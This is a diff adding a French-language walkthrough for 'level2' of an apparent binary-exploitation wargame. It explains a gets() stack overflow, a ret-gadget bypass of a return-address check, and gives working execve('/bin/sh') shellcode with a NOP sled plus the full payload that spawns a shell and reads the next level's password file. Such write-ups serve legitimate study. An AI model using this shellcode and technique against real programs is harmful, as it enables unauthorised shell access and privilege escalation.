@@ -1,0 +1,42 @@
+Pour ce niveau, lorsqu'on desassemble le programme level2,
+on se rend compte de deux choses: deja, le programme utilise
+la fonction gets (facile a exploiter avec un buffer overflow)
+et ensuite, on remarque qu'aucune fonction n'appelle un shell
+donc on se doute qu'il va falloir utiliser du shellcode. Nous
+allons donc commencer par preparer notre shellcode qui aura
+pour simple but de faire un execve("/bin/sh", ..., ...) avec
+la commande suivante:
+export EXPLOIT=`python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
+Les 100 \x90 servent a avoir une certaine faciliter a obtenir l'adresse.
+Maintenant, lorsqu'on regarde la fonction p du programme, on vois
+qu'elle se "protege" contre les buffers overflow en faisant un exit
+si la valeur sauvegarder de l'eip ressemble a 0xb.......
+Cependant les autres adresses ne sont pas bloquées.
+Avec la meme technique qu'a l'exercice precedent, on vois que
+l'eip se trouve a 80 octets de notre entree.
+On peut donc faire pointer l'eip vers un ret ce qui aura pour effet
+de refaire un    pop eip.   On peut donc commencer notre payload de
+cette maniere:
+(python -c 'print "hehe"*20 + "\x4b\x85\x04\x08" + "\x??\x??\xff\xbf"')
+                                            ^     -------^
+                                            |    /
+                                adresses acceptées (a cet endroit)
+Ensuite avec une commande on peut determiner vers ou se trouve notre shellcode:
+mkdir /tmp/gdelabro ; cd /tmp/gdelabro ; echo "int main(void){printf(\"%p\\n\", getenv("EXPLOIT"));}" > prog.c ; gcc prog.c ; ./a.out ; cd ~
+Et on s'aidera de gdb pour savoir ou faire pointer notre eip
+On va prendre environ l'adresse au milieu des \x90 pour etre sure d'etre sur
+une adresse valide dans le contexte de notre programme. il nous suffit
+donc de remplacer les ?? de notre payload par notre adresse et de lancer
+notre programme avec (tout en gardant la main sur le stdin). On a donc:
+(python -c 'print "hehe"*20 + "\x4b\x85\x04\x08" + "\x19\xf9\xff\xbf"' ; cat) | ./level2
+Il nous suffit maintenant de faire un
+cat /home/user/level3/.pass
+
+
+exploit:
+export EXPLOIT=`python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
+mkdir /tmp/gdelabro ; cd /tmp/gdelabro
+echo "int main(void){printf(\"%p\\n\", getenv(\"EXPLOIT\"));}" > prog.c ; gcc prog.c ; ./a.out
+cd ~
+gdb level2     // break main   // run   // x/20x adresse_en_haut
+(python -c 'print "haha"*20 + "\x4b\x85\x04\x08" + "\x19\xf9\xff\xbf"')
